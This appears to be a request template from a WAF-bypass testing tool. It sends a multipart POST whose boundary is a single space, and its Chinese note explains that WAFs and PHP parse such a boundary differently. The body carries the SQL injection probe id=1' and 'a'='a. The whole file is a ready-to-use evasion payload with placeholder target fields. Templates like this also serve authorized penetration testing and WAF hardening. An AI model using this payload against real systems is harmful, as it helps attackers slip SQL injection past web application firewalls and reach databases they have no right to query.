# @name: multipart空格boundary
# @tags: post,multipart,space-boundary,php,id,bypass
# @color: rose
# @validate: baseline_similarity
# @threshold: 0.92
# @intent: multipart_space_boundary
# @intent.param: id
# @intent.payload: id=1' and 'a'='a
# @note: boundary 的值为一个空格(而非空字符串)，WAF 与 PHP 对空格 boundary 的容错处理不同，可造成解析不一致。参考 do9gy multipart Part1 第9条。
POST / HTTP/1.1
Host: {{TARGET_HOST_HEADER}}
User-Agent: {{USER_AGENT}}
Content-Type: multipart/form-data; boundary= 

-- 
Content-Disposition: form-data; name="id"

1' and 'a'='a
-- --
